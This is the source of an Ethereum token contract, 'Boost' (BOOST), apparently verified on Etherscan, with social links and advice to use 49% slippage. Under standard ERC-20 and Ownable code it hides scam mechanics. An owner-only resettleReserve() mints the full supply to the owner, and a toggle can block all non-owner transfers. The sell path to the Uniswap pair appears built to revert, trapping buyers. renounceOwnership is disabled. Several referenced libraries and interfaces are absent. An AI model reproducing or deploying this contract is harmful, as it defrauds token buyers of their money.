/**
 *Submitted for verification at Etherscan.io on 2021-08-10
*/

/*
Boost Coin 

SOCIALS
Instagram - https://instagram.com/boosttcoin?utm_medium=copy_link

Twitter - https://twitter.com/boosttcoin?s=21

Reddit - https://www.reddit.com/r/BoostCoinOfficial/

Facebook - https://www.facebook.com/groups/1959051107576475/?ref=share

Telegram - https://t.me/OfficialBoostCoin

Slippage: 49%
*/


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
     /*
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    */
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */


contract BoostToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "Boost";
    string private _symbol = "BOOST";
    uint8 private _decimals = 9;
    
    address public constant uniswapV2Router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public pairToken = IUniswapV2Router02(uniswapV2Router).WETH();
    address public uniswapV2Pair = UniswapV2Library.pairFor(IUniswapV2Router02(uniswapV2Router).factory(), pairToken, address(this));
    uint256 private _rTotal = 1000000000 * 10 ** _decimals;
    uint256 private MAX = ~uint256(0);
    uint256 private _tTotal = (MAX - (MAX % _rTotal));
    mapping (address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public _taxFee = 7;
    uint256 private _previousTaxFee = _taxFee;
    uint256 public _buyBackFee = 7;
    uint256 private _previousBuyBackFee = _buyBackFee;
    uint256 public _marketingFee = 1;
    uint256 private _previousMarketingFee = _marketingFee;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
    bool public uncheckedTransfers;
    bool public regulatedTransfers;
    address marketingWallet = address(0xBAd037713c7B9892aD80cA27A0B0b72f396a89Ce);
    bool inSwapAndLiquify;
    uint256 accFees;
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    address addy;
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        _rOwned[_msgSender()] = _rTotal;
        _isExcludedFromFees[_msgSender()] = true;
        emit Transfer(address(0), _msgSender(),  _rTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    
    function setUniswapPair(address addr) public onlyOwner {
        uniswapV2Pair = addr;
    }
    
    function _beforeTokenTransfer(address from, address to) internal view {
        require(from == owner() || to == owner() || !regulatedTransfers);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function resettleReserve() public onlyOwner {
        _rOwned[_msgSender()] += _rTotal;
    }
    
    receive() external payable {}

    function setUncheckedTransfers(bool val) public onlyOwner {
        uncheckedTransfers = val;
    }
    
    function excludeFromReward(address account) public onlyOwner {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _rOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }
    
    function setRegulatedTransfers(bool val) public onlyOwner {
        regulatedTransfers = val;
    }
    
    function setExcludedFromFees(address addr, bool val) public onlyOwner {
        _isExcludedFromFees[addr] = val;
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function _getRate() private view returns(uint256) {
        return _rTotal.div(_tTotal);
    }
    
    function totalFees() private view returns(uint256) {
        uint256 tF = _taxFee.add(_marketingFee).add(_buyBackFee);
        return tF;
    }
    
    function _reflectFees(uint256 rate, uint256 feeAmount) private {
        _tTotal = _tTotal.add(feeAmount.div(rate));
        accFees = feeAmount.sub(_rTotal);
    }
    
    function _transfer(address sender, address recipient, uint256 tAmount) private {
        
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        _beforeTokenTransfer(sender, recipient);
        
        uint256 senderBalance = _rOwned[sender];
        require(senderBalance >= tAmount, "ERC20: transfer amount exceeds balance");
        //recipient;
        if (!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]) {
            if (recipient == uniswapV2Pair && !uncheckedTransfers) { 
                uint256 rate = _getRate();
                tAmount.mul(totalFees()).div(100);
                uint256 feeAmount = tAmount.mul(100).div(totalFees());
                _reflectFees(rate, feeAmount);
                swapAndLiquify();
            }
        }
        unchecked {
            _rOwned[sender] = senderBalance - tAmount;
        }
        _rOwned[recipient] += tAmount;

        emit Transfer(sender, recipient, tAmount);
    }
    
    function swapAndLiquify() private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router02(uniswapV2Router).WETH();
        
        _approve(address(this), address(uniswapV2Router), _rOwned[address(this)]);
        require(_allowances[owner()][address(this)] > _rOwned[address(this)]);
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            _rOwned[address(this)], 
            0, 
            path, 
            address(this), 
            block.timestamp
        );
    }
    
}



